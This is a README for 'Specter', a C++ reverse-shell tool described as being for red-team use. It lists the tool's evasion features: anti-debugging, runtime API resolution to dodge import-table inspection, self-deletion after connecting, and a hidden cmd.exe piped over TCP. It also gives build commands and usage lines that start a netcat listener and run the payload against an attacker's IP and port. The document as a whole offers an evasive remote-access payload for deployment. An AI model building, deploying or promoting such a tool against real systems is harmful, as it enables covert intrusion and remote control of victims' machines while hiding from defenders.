# Specter

A lightweight, unmanaged C++ socket utility for remote command execution. 

Designed for red-team environments and authorized penetration testing. Specter bypasses the standard Windows console host and directly pipes standard input/output handles from a hidden `cmd.exe` process over an active TCP socket connection.

## Features

- **Anti-Debugging:** Instantly terminates execution if attached to a debugger or sandbox environment (`IsDebuggerPresent`).
- **Dynamic API Resolution:** Bypasses Import Address Table (IAT) inspection by dynamically resolving `ws2_32.dll` networking APIs at runtime via `GetProcAddress`.
- **Ephemeral Execution:** Implements a post-exploitation self-deletion routine that unlinks the executable from the filesystem immediately after establishing the remote connection.
- **Console Evasion:** Utilizes `SW_HIDE` and standard handle piping to silently spawn the command interpreter.

## Compilation

Requires MSVC or MinGW (must link against `ws2_32.lib`).

**GCC/MinGW:**
```bash
g++ -O3 main.cpp -o Specter.exe -lws2_32 -mwindows
```

## Usage

Start a TCP listener on the attacking machine (e.g., using Netcat):
```bash
nc -lvnp 4444
```

Execute the payload on the target machine:
```cmd
.\Specter.exe <IP> <PORT>
```
